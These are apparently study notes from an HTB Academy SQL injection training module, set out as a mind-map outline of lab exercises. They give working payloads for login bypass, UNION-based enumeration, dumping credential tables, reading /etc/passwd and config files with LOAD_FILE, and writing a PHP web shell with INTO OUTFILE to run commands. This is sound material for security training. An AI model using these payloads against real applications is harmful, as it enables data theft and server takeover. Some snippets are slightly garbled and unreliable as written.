---
tags: [CWES, HTB, technical-reference]
module: "SQL Injection Fundamentals"
source_file: "CWES.xmind"
---

# SQL Injection

> [!info] Complete technical reference
> Section imported without removing commands, hints, links, notes, or images.

## Types of SQL Injections

### IN BAND

- UNION BASED
  - specify the exact location, 'i.e., column',
- ERROR BASED
  - PHP or SQL errors
### BLIND

- TIME BASED
  - Sleep()
- BOOLEAN BASED
### OUT OF BAND

- DNS
- SMTP
- HTTP
## SQLi Discovery

### payloads

- Payload	URL Encoded  
  '	%27  
  "	%22  
  #	%23  
  ;	%3B  
  )	%29
  - add one of the payloads after our username
  - <note:%20In%20some%20cases,%20we%20may%20have%20to%20use%20the%20URL%20encoded%20version%20of%20the%20payload.%20An%20example%20of%20this%20is%20when%20we%20put%20our%20payload%20directly%20in%20the%20URL%20'i.e.%20HTTP%20GET%20request'.>
### OR Injection

- Auth Bypass with OR operator
  - admin' or '1'='1
  - notAdmin' or '1'='1
    - The login failed because notAdmin does not exist in the table
      ![[Attachments/86162f5ac6881122a2c30f8c0bb49c8e1441dc292e546a685b0fe311b08907be.png]]
      - injecting an OR condition into the password field,
        - something' or '1'='1
  - LAB
    - Try to log in as the user 'tom'. What is the flag value shown after you successfully log in?
      - with comment
        - username
          - tom' and '7'='7' #
            - both true and comment
        - password
          - anything';;#
      - or maybe without comment
        - username
          - tom' and '7'='7
        - password
          - a' or '1'='1
### Using Comments

- admin'--
- admin' or '1'='1'-- -
- open parenthesis
  - admin')--
    - the original payload  was something like
      - SELECT * FROM logins where (username='admin')
- LAB
  - Login as the user with the id 5 to get the flag.
    - username
      - n') or id = 5 #
### Union Clause

- UNION explain
  - Union clause is used to combine results from multiple SELECT statements.
    - A UNION statement can only operate on SELECT statements with an equal number of columns
  - UNION SELECT username, 2, 3, 4 from passwords-- '
- Union Injection
  - Search field
    - Detect number of columns
      - Using ORDER BY
        - start with order by 1
          - ' order by 1-- -
        - then order by 3 until we reach a number that returns an error
      - use UNION NULL
        - cn' UNION select 1,2,3-- -
          - don’t match:
          - cn' UNION select 1,2,3,4-- -
            - successfully
              - determine which columns are printed to the page
                - columns 2 and 3, and 4 are printed
                  - cn' UNION select 1,@@version,3,4-- -
  - LAB
    - ' order by 4-- -
      - success
    - ' union select user(),2,3,4 -- -
      - no result
    - ' union select 1,user(),3,4 -- -
      - we got in the last row
        - root@localhost
## Database Enumeration

### MySQL Fingerprinting

- Payload	When to Use	Expected Output	Wrong Output  
  SELECT @@version	When we have full query output	MySQL Version 'i.e. 10.3.22-MariaDB-1ubuntu1'	In MSSQL it returns MSSQL version. Error with other DBMS.  
  SELECT POW(1,1)	When we only have numeric output	1	Error with other DBMS  
  SELECT SLEEP(5)	Blind/No Output	Delays page response for 5 seconds and returns 0.	Will not delay response with other DBMS
  - @@version
    - MySQL
    - MariaDB
    - MSSQL
### INFORMATION_SCHEMA Database

- UNION SELECT
  - we need the following information:
    - List of databases
    - List of tables within each database
    - List of columns within each table
- to reference a table present in another DB
  - ‘.’ operator
    - SELECT * FROM my_database.users;
- we should find what databases are available on the DBMS
  - INFORMATION_SCHEMA > SCHEMATA
    - SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
      - +--------------------+  
        | SCHEMA_NAME        |  
        +--------------------+  
        | mysql              |  
        | information_schema |  
        | performance_schema |  
        | ilfreight          |  
        | dev                |  
        +--------------------+
### UNION information_schema

- cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
  - cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
- determine which one used by webserver to get the ports
  - cn' UNION select 1,database(),2,3-- -
    - ilfreight
    - dev
- dump data from the dev
  - we need to get a list of the tables to query them with a SELECT statement
    - we are interested in the TABLE_SCHEMA and TABLE_NAME
      - cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
        - [the result image](https://academy.hackthebox.com/storage/modules/33/ports_tables_1.jpg)
          ![[Attachments/e236e85b14d3f00f995ec7d00a5c70d7a8f20d60c4283ab1873ff98de5011b13.png]]
- dump the data of the credentials table
  - we first need to find the column names in the table, which can be found in the COLUMNS table in the INFORMATION_SCHEMA
    - cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
      - username
      - password
  - cn' UNION select 1, username, password, 4 from dev.credentials-- -
    - we got sensitives hashes and API key
- LAB
  - cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
    - ilfreight
  - cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='ilfreight'-- -
    - users
    - product
    - ports
  - cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='users'-- -
    - username
    - password
  - cn' UNION select 1, username, password, 4 from ilfreight.users-- -
    - newuser | Hash_Value
## Reading Files

### Privileges

- Reading data is much more common than writing data, which is strictly reserved for privileged users in modern DBMSes,
  - MySQL
    - FILE privilege
- check our privileges
  - SELECT USER()
  - SELECT CURRENT_USER()
  - SELECT user from mysql.user
  - SELECT super_priv FROM mysql.user
  - cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
    - returns Y, which means YES
- Our UNION injection payload will be
  - cn' UNION SELECT 1, user(), 3, 4-- -
    - root'@'localhost
      - very promising, as a root user is likely to be a DBA, which gives us many privileges.
  - cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
  - cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
- dump other privileges we have directly from the schema
  - cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
    - cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
      - SELECT  
        INSERT  
        UPDATE  
        DELETE  
        CREATE  
        DROP  
        RELOAD  
        SHUTDOWN  
        PROCESS  
        FILE
### LOAD_FILE

- LOAD_FILE() function can be used in MariaDB / MySQL
  - SELECT LOAD_FILE('/etc/passwd');
  - using a UNION injection
    - cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
      - root:x:0:0:root:/root:/bin/bash  
        daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin  
        bin:x:2:2:bin:/bin:/usr/sbin/nologin
    - cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
      - [Ctrl + U]
        - The source code shows us the entire PHP code
          - include "config.php";  
            ?>
          - <?<!-- -->php  
            if (isset($_GET["port_code"])) {  
            $q = "Select * from ports where code like '%".$_GET["port_code"]."%'";  

            $result = mysqli_query($conn,$q);  
            if (!$result)  
            {  
            die("</table></div><p style='font-size: 15px'>".mysqli_error($conn)."</p>");  
            }  
            while($row = mysqli_fetch_array($result))  
            {  
            echo "<tr><td style=\"width:400px\" colspan=3>".$row[1]."</td><td style=\"width:400px\" colspan=3>".$row[2]."</td><td style=\"width:450px\" colspan=3>".$row[3]."</tr>";  
            }  
            }  
            ?>
            - '$conn' is not defined, so it must be imported using the PHP include command. Check the imported page to obtain the database password. (the include (import} was in top lines)
              - cn' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- -
## Writing Files

### much more restricted in modern DBMSes

### write files to the back-end server using a MySQL database, we require three things

- User with FILE privilege enabled
- MySQL global secure_file_priv variable not enabled
  - determine where to read/write files from
- Write access to the location we want to write to on the back-end server
  - /var/lib/mysql-files as the default folder
    - means that reading files through a MySQL injection isn't possible with default settings.
### find out the value of secure_file_priv

- SHOW VARIABLES LIKE 'secure_file_priv';
- using a UNION injection
  - INFORMATION_SCHEMA
    - variable_name and variable_value
  - SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
    - cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
      - secure_file_priv value is empty, meaning that we can read/write files to any location.
### SELECT INTO OUTFILE

- to export the results into the file we specified.
  - SELECT * from users INTO OUTFILE '/tmp/credentials';
    - cat (bash)
      - 1       admin   392037dbba51f692776d6cefb6dd546d  
        2       newuser 9da2c9bcdf39d8610954e0e11ea8f45f
  - SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
  - select 'file written successfully!' into outfile '/var/www/html/proof.txt'
- UNION injection payload
  - cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
    - curl http://SERVER_IP:PORT/proof.txt
### Writing a Web Shell

- <?<!-- -->php sys<!-- -->tem($_REQUEST[0]); ?>
- UNION injection payload
  - cn' union select "",'<?<!-- -->php sys<!-- -->tem($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
    - http://SERVER_IP:PORT/shell.php?0=id
      - uid=33(www-data) gid=33(www-data) groups=33(www-data)
      - curl http://94.237.59.225:32981/shell.php?0=cat+../flag.txt
